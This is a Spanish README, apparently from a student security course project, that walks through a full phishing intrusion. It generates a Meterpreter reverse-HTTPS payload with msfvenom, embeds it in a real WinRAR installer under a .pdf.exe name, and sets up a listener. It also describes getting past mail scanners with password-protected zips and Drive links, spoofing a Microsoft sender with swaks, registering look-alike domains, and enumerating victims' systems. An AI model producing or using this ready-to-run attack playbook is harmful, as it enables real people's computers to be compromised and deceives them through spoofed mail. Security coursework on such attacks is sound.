# Proyecto Grupo 4 - Generación de Payload con Evasión de Antivirus

Este proyecto demuestra cómo generar un archivo malicioso usando Metasploit, enviárselo a una víctima mediante técnicas de ingeniería social, y obtener información del sistema comprometido. Todo el trabajo se realiza desde Kali Linux.

---

## Requisitos

Tener Kali Linux instalado. Si usas la configuración del grupo, abre el archivo KaliLinux.exe que lanza Kali en pantalla completa automáticamente.

Dentro de Kali, instalar Metasploit si no viene incluido:

```
sudo apt-get update
sudo apt-get install metasploit-framework
```

---

## Paso 1 - Conocer tu IP

Antes de generar el payload necesitas saber cuál es tu IP en la red. Ejecuta este comando en la terminal de Kali:

```
ip a
```

Busca la interfaz que dice eth0 o algo parecido y anota el número que aparece después de inet. Ese número es tu LHOST, que es la dirección a la que se va a conectar la víctima cuando abra el archivo.

Si la víctima está fuera de tu red local, necesitas tu IP pública. La puedes ver con:

```
curl ifconfig.me
```

---

## Paso 2 - Generar el payload

Ejecuta el script que viene en el repositorio. El script te muestra tu IP, te pregunta cuál usar y genera el archivo automáticamente:

```
bash generar_payload.sh
```

Si prefieres correr el comando tú mismo a mano, es este:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o actualizacion_sistema.exe
```

Lo que hace cada parte del comando:

`msfvenom` es la herramienta de Metasploit que se encarga de crear los payloads.

`-p windows/x64/meterpreter/reverse_https` define el tipo de conexión que va a hacer el archivo cuando alguien lo abra. La palabra reverse significa que la víctima es la que llama a tu computadora, no al revés. El HTTPS hace que el tráfico parezca navegación web normal, por eso los antivirus no lo bloquean de inmediato.

`LHOST` es tu IP, o sea la dirección a la que se conecta la víctima.

`LPORT 443` es el puerto que se usa. El 443 es el puerto estándar de HTTPS, ningún firewall lo bloquea porque es el mismo que usan todas las páginas web seguras.

`-f exe` le dice a msfvenom que el archivo final sea un ejecutable de Windows.

`-o actualizacion_sistema.exe` es el nombre con el que se guarda el archivo que se genera.

---

## Paso 3 - Configurar el listener

El listener es el proceso que se queda escuchando en tu computadora esperando que la víctima abra el archivo. Tienes dos formas de iniciarlo.

Forma automática usando el script incluido:

```
msfconsole -r listener.rc
```

Forma manual escribiendo cada comando dentro de msfconsole:

```
msfconsole
```

Una vez que carga, escribes estos comandos uno por uno:

```
use exploit/multi/handler
```

Esto selecciona el módulo que recibe conexiones entrantes.

```
set payload windows/x64/meterpreter/reverse_https
```

Define qué tipo de conexión vas a recibir. Tiene que coincidir exactamente con lo que pusiste al generar el payload.

```
set LHOST 0.0.0.0
```

El 0.0.0.0 significa que acepta conexiones en cualquier interfaz de red de tu máquina.

```
set LPORT 443
```

El mismo puerto que usaste al generar el payload.

```
set ExitOnSession false
```

Esto hace que el listener siga activo después de recibir una conexión, por si hay más de una víctima en la demo.

```
run
```

Inicia el listener. A partir de este momento tu computadora está esperando la conexión.

---

## Paso 4 - Enviar el archivo a la víctima

El archivo generado tiene que llegarle a la víctima de forma convincente para que lo ejecute.

Por correo electrónico: comprimes el archivo en un zip con contraseña para que el escáner del servidor de correo no lo analice. En el cuerpo del correo pones la contraseña. El asunto puede ser algo como "Actualización pendiente del sistema" o "Documento del proyecto compartido".

```
zip -e actualizacion_protegida.zip actualizacion_sistema.exe
```

Por red social o mensajería: subes el archivo a Google Drive y mandas el link. Google Drive no escanea el contenido de ejecutables, solo documentos de Office y PDFs.

---

## Paso 5 - Obtener la información del sistema

Cuando la víctima ejecuta el archivo, en tu terminal aparece este mensaje:

```
[*] Meterpreter session 1 opened
```

Eso significa que ya tienes acceso. Ahora ejecutas los comandos para obtener la información que pide el proyecto.

Información general del sistema:

```
sysinfo
```

Este comando muestra el nombre del equipo, el sistema operativo con su versión, la arquitectura del procesador y el idioma del sistema.

Nombre del usuario actual y su SID:

```
getuid
```

Muestra quién está usando la computadora en ese momento. El SID es el identificador único del usuario dentro del sistema Windows.

Para obtener el SID completo:

```
run post/windows/gather/enum_system
```

Este módulo recopila toda la información del sistema de una vez, incluyendo el SID, los usuarios del equipo, los grupos y la configuración de red.

Listado del directorio actual:

```
shell
dir
```

Con shell abres una terminal de Windows dentro de la sesión. Con dir ves los archivos y carpetas del directorio donde está parado el usuario en ese momento.

---

## Estructura del repositorio

```
grupo4-seguridad/
    README.md                 explicación completa del proyecto
    generar_payload.sh        script que genera el payload pidiendo la IP
    listener.rc               script que configura el handler automáticamente
    capturas/                 carpeta donde van las screenshots para el reporte
```

---

## Paso 6 - Crear el .exe que parece un archivo legítimo

El archivo que genera msfvenom por defecto se ve como un ejecutable genérico de Windows. Para que la víctima lo abra sin sospechar, hay que disfrazarlo para que parezca un documento de Word, un PDF o una imagen.

El truco de la doble extensión funciona porque Windows oculta las extensiones de archivo por defecto. Si el archivo se llama así:

```
Documento_Proyecto.pdf.exe
```

La víctima solo va a ver esto en su pantalla:

```
Documento_Proyecto.pdf
```

Para que además tenga el ícono de un PDF de verdad, dentro de Kali instalas esta herramienta:

```
sudo apt-get install icoutils
```

Descargas un ícono de PDF en formato .ico y se lo asignas al ejecutable con wrestool. Pero la forma más rápida para la demo es usar un instalador real como plantilla al momento de generar el payload. Metasploit puede inyectar el payload dentro de un ejecutable legítimo y el resultado hereda el ícono y la firma visual del original:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -x /ruta/instalador_real.exe -f exe -o Documento_Proyecto.pdf.exe
```

Donde `-x /ruta/instalador_real.exe` es cualquier ejecutable de Windows que tengas a la mano, por ejemplo un instalador de WinRAR o de VLC que descargues en Kali con:

```
wget https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -O instalador_real.exe
```

El archivo resultante tiene el ícono de WinRAR, abre WinRAR cuando la víctima lo ejecuta, y al mismo tiempo abre la conexión hacia tu máquina sin que nadie se dé cuenta.

Para comprimir el archivo con contraseña antes de enviarlo:

```
zip -e archivo_protegido.zip Documento_Proyecto.pdf.exe
```

Te pide que pongas una contraseña. Esa contraseña la incluyes en el cuerpo del correo. Los escáneres de los servidores de correo no pueden ver dentro de un zip con contraseña, así que el archivo pasa sin ser detectado.

---

## Paso 7 - Hacer que el correo no parezca falso

Un correo que parece legítimo es la diferencia entre que la víctima abra el archivo o lo mande directo a la papelera. Hay varias formas de lograrlo.

La primera es usar un servicio que te deja enviar correos desde cualquier dirección sin tener acceso a esa cuenta. Esto se llama email spoofing y funciona porque no todos los servidores de correo verifican que el remitente sea real. Desde Kali puedes usar swaks para hacer esto:

```
sudo apt-get install swaks
```

Y envías el correo así:

```
swaks --to victima@correo.com --from soporte@microsoft.com --server smtp.gmail.com:587 --auth LOGIN --auth-user TU_CORREO@gmail.com --auth-password TU_PASSWORD --tls --header "Subject: Actualización de seguridad requerida" --body "Se ha detectado actividad inusual en su cuenta. Descargue el archivo adjunto para verificar su identidad. Contraseña del archivo: 1234" --attach archivo_protegido.zip
```

Lo que esto hace es mandar el correo usando tu cuenta de Gmail como servidor, pero poniendo `soporte@microsoft.com` como remitente visible. Muchos clientes de correo muestran solo el nombre del remitente, no la dirección real, así que la víctima ve "Soporte Microsoft" sin cuestionar nada.

La segunda forma es registrar un dominio que se parezca al real. Esto se llama typosquatting. Por ejemplo si la víctima espera un correo de su empresa que usa `empresa.com`, tú registras `empresa-soporte.com` o `empresa.com.co` y mandas el correo desde ahí. El costo de registrar un dominio es de unos tres dólares y le da mucha más credibilidad al correo.

La tercera forma, que es la más efectiva para una demo controlada, es subir el archivo a Google Drive y mandar solo el link en el correo. Google Drive no escanea ejecutables, y un link de Drive se ve completamente legítimo. El correo queda así de simple:

```
Asunto: Documento del proyecto - revisión final

Hola,

Te comparto el documento actualizado para que lo revises antes de la presentación.

Link: https://drive.google.com/file/d/XXXXXXXXXXXX

Cualquier duda me avisas.
```

Sin adjuntos sospechosos, sin archivos zip, sin nada que levante alarmas. La víctima hace clic en un link de Google que parece completamente normal, descarga el archivo y lo abre.

Para que el correo se vea todavía más real, puedes agregarle una firma con nombre, cargo y número de teléfono inventados. La mayoría de las personas no verifica si el número de teléfono de una firma existe o no.

---

## Información del grupo

Proyecto de la materia de Seguridad Informática.

Integrantes: Cossio Brenda, López Quezada Lisman, Guerra Acosta Cristian.

Tarea asignada: Generar un archivo malicioso que será enviado a la víctima vía correo electrónico o red social. El archivo debe ser confeccionado de forma que sea creíble e invite a la víctima a ejecutarlo. La información mínima a obtener del equipo víctima es la siguiente: información del sistema, SID, nombre del usuario actual y listado del directorio actual.
